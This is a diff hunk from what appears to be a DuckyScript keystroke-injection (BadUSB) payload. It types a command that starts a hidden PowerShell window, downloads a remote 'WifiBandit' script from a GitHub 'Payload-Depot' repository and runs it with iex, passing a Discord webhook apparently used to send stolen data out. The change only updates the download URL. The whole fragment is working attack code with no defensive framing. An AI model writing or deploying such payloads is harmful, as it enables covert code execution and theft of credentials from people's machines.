@@ -12,5 +12,5 @@ DELAY 3000
 STRING $webhook = '<DISCORD WEBHOOK HERE>'
 ENTER
 SPACE
-STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Wifi%20Bandit/WifiBandit.txt').Content" -NoNewWindow
+STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/refs/heads/main/SignalStrike/Wifi%20Bandit/WifiBandit.txt').Content" -NoNewWindow
 ENTER
